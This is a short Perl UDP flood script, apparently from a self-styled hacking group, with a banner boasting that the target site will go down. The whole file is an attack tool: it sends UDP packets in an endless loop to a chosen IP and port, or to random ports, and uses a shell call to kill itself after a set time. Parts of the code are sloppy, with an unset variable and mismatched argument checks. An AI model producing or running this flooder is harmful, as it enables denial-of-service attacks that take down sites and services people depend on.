#!/usr/bin/perl
#####################################################
# UDP FLOOD !!.
#
# HSH.
#
# --/HSH
######################################################

use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
printf "$0 <ip> <port> <time>\n";
printf "if arg1/2 =0, randports/continous packets.\n";
exit(1);
}

my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[1];
$time=$ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

printf "
\e[36;1m
   mm.           dM8
   YMMMb.       dMM8
    YMMMMb     dMMM'
     YMMMb   dMMMP
       YMMM  MMM'
          MbdMP
      .dMMMMMM.P   -=[DDoS-WEBSITE-LANGUAGE-PERL]=-
     dMM  MMMMMMM  -=[Coded By zTobiCode]=-
     8MMMMMMMMMMI  -=[Team : InfecterSquad | Exploit]=-
      YMMMMMMMMM   -=[Telegram : COMING SOON]=-
        MMMMMMP
       MxM .mmm
          
Packets : 8000 // Soon The Site Will Go Down !!\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto randpackets;
}

packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}

randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 65500) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
